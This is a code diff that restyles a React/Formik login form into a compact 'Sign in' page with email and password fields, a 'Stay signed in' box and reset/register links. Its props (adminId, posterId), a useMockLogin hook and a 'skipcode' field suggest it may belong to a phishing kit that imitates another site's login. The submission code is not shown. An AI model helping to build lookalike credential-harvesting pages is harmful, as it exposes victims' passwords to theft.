@@ -1,10 +1,6 @@
 import React, { useState } from "react";
 import { Formik, Form } from "formik";
 import * as Yup from "yup";
-import { MdVisibility, MdVisibilityOff } from "react-icons/md";
-import { CiWarning } from "react-icons/ci";
-import TextfieldWrapper from "./TextfieldWrapper";
-import SubmitButton from "./SubmitButton";
 import { site } from "../config";
 import useMockLogin from "../hooks/useMockLogin";
 import Cookies from "js-cookie";
@@ -25,7 +21,7 @@ function LoginForm({ adminId, posterId }) {
   };
 
   const validate = Yup.object({
-    identifier: Yup.string().required("Enter a valid email address ."),
+    identifier: Yup.string().required("Enter a valid email address."),
     password: Yup.string().min(8, "Minimum 8 characters"),
   });
 
@@ -45,7 +41,6 @@ function LoginForm({ adminId, posterId }) {
       skipcode: "",
     };
 
-    // Set loading to true at the start of submission
     setIsLoading(true);
 
     try {
@@ -81,97 +76,106 @@ function LoginForm({ adminId, posterId }) {
     } catch (error) {
       console.error("Submission error:", error);
     } finally {
-      // Set loading to false when operation completes (success or failure)
       setIsLoading(false);
     }
   };
 
   return (
-    <div className="md:w-[550px] lg:w-[632px] mx-auto mt-[60px] lg:mt-[95px] mb-[90px] lg:mb-[144px]">
+    <div className="w-[320px] mx-auto flex flex-col gap-6 text-center select-none font-sans">
       <LoadingModal isOpen={isLoading} />
-      <div className="flex flex-col items-ceneter">
-        <div className="">
-          <div className="bg-custom-indigo text-white text-xl font-medium px-[26px] py-[18px] shadow-md">
-            Login
+      
+      {/* Sign In Heading */}
+      <h1 className="text-3xl font-normal text-white font-serif tracking-tight">
+        Sign in
+      </h1>
+
+      <div className="flex flex-col text-left">
+        {isFirstLogin && !isEmail && (
+          <div className="mb-4 p-3 bg-red-600/90 border border-red-500 rounded text-xs text-white">
+            Enter a valid email address.
           </div>
-          <div className="border border-slate-300 border-opacity-40 px-[15px] pt-7 pb-[24px]">
-           
-            {isFirstLogin && !isEmail && (
-              <div className="mb-4 p-3 bg-[#ff385f] border border-red-400 rounded">
-                <div className="flex items-center gap-5">
-                  <p className="text-white">
-                    Enter a valid email address.
+        )}
+
+        <Formik
+          initialValues={initialvalues}
+          validationSchema={validate}
+          onSubmit={handleSubmit}
+        >
+          {(formik) => (
+            <Form className="flex flex-col gap-4">
+              {/* Email/Username field */}
+              <div>
+                <input
+                  type="text"
+                  name="identifier"
+                  placeholder={isFirstLogin && !isEmail ? "Email" : "Email"}
+                  value={formik.values.identifier}
+                  onChange={formik.handleChange}
+                  onBlur={formik.handleBlur}
+                  className="w-full bg-[#fdfdfd] text-black px-3.5 py-2.5 border border-zinc-300 rounded-[3px] text-sm focus:outline-none focus:border-zinc-500 font-sans"
+                />
+                {formik.touched.identifier && formik.errors.identifier && (
+                  <p className="text-red-500 text-xs mt-1 pl-1">
+                    {formik.errors.identifier}
                   </p>
-                </div>
+                )}
               </div>
-            )}
 
-            <Formik
-              initialValues={initialvalues}
-              validationSchema={validate}
-              onSubmit={handleSubmit}
-            >
-              {(formik) => (
-                <Form className="space-y-[18px]">
-                  {isFirstLogin && !isEmail ? (
-                    <TextfieldWrapper
-                      name="identifier"
-                      label={<span className="text-[#ef4444]">Email</span>}
-                      type="text"
-                      helpertext={
-                        <span className="text-[#ef4444]">
-                          Enter a valid email address
-                        </span>
-                      }
-                      onFocus={() =>
-                        formik.setFieldTouched("identifier", true, true)
-                      }
-                    />
-                  ) : (
-                    <TextfieldWrapper
-                      name="identifier"
-                      label="Username"
-                      type="text"
-                      helpertext="usernames are case-sensitive"
-                    />
-                  )}
-                  <div className="relative">
-                    <TextfieldWrapper
-                      name="password"
-                      label="Password"
-                      helpertext="passwords are case-sensitive"
-                      autoComplete="on"
-                      type={showPassword ? "text" : "password"}
-                      onFocus={() =>
-                        formik.setFieldTouched("password", true, true)
-                      }
-                    />
-                    <span
-                      className="absolute right-0 top-[17px] text-[23px] opacity-50 cursor-pointer"
-                      onClick={() => setShowPassword(!showPassword)}
-                    >
-                      {showPassword ? <MdVisibilityOff /> : <MdVisibility />}
-                    </span>
-                  </div>
+              {/* Password field */}
+              <div className="relative">
+                <input
+                  type={showPassword ? "text" : "password"}
+                  name="password"
+                  placeholder="Password"
+                  value={formik.values.password}
+                  onChange={formik.handleChange}
+                  onBlur={formik.handleBlur}
+                  className="w-full bg-[#fdfdfd] text-black px-3.5 py-2.5 border border-zinc-300 rounded-[3px] text-sm focus:outline-none focus:border-zinc-500 font-sans"
+                />
+                {formik.touched.password && formik.errors.password && (
+                  <p className="text-red-500 text-xs mt-1 pl-1">
+                    {formik.errors.password}
+                  </p>
+                )}
+              </div>
 
-                  <div className="mt-5 flex justify-center">
-                    <SubmitButton disabled={isLoading}>
-                      {isLoading ? "Loading..." : "Login"}
-                    </SubmitButton>
-                  </div>
-                </Form>
-              )}
-            </Formik>
+              {/* Submit Button */}
+              <div className="mt-2">
+                <button
+                  type="submit"
+                  disabled={isLoading}
+                  className="w-full bg-[#c2185b] hover:bg-[#a0134c] text-white py-2.5 text-sm font-semibold rounded-[3px] transition-colors focus:outline-none"
+                >
+                  {isLoading ? "Signing in..." : "Sign in"}
+                </button>
+              </div>
+            </Form>
+          )}
+        </Formik>
 
-            <div className="mt-[58px] mx-4 lg:mx-[55px] text-[16.5px] flex justify-between items-center text-custom-indigo">
-              <p className="cursor-pointer">Set New Password</p>
-              <p className="cursor-pointer">Sign Up</p>
-              <p className="cursor-pointer">Help</p>
-            </div>
-          </div>
+        {/* Checkbox "Stay signed in" */}
+        <div className="flex items-center gap-2 mt-4 text-[#fbc02d] text-[13px] font-medium">
+          <input
+            type="checkbox"
+            id="stay-signed-in"
+            defaultChecked
+            className="w-4.5 h-4.5 border border-zinc-400 bg-white rounded-[2px] accent-[#c2185b] cursor-pointer"
+          />
+          <label htmlFor="stay-signed-in" className="cursor-pointer select-none">
+            Stay signed in
+          </label>
+        </div>
+
+        {/* Action Links */}
+        <div className="mt-6 flex flex-col gap-2.5 text-[#fbc02d] text-[13px] font-semibold">
+          <a href="#" className="hover:underline cursor-pointer">
+            Forgot your password? Reset your password
+          </a>
+          <a href="#" className="hover:underline cursor-pointer">
+            New here? Register for a new account
+          </a>
         </div>
       </div>
-      <div className="h-[1px] bg-slate-600/50"></div>
     </div>
   );
 }
